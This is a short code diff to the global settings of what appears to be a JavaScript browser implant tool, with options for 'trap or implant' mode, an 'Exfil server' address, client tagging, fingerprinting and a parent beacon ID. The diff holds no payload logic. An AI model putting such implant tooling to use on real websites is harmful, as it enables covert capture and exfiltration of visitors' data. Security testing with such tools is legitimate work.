@@ -49,10 +49,10 @@ function initGlobals()
 	// like adding directly to the javascript
 	// on the application server. 
 	// Setting: trap or implant
-	window.taperMode = "trap";
+	window.taperMode = window.taperMode ?? "trap";
 
 	// Exfil server
-	window.taperexfilServer = "https://127.0.0.1:8444";
+	window.taperexfilServer = window.taperexfilServer ?? "https://127.0.0.1:8444";
 
 
 	// Below settings only matter if you're in trap mode
@@ -105,7 +105,10 @@ function initGlobals()
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "wp";
+	window.taperTag = window.taperTag ?? "wp";
+
+	// Parent beacon UUID — set by BEX before loading, null for standalone
+	window.taperParentUUID = window.taperParentUUID ?? null;
 
 
 	// Should we fingerprint clients?
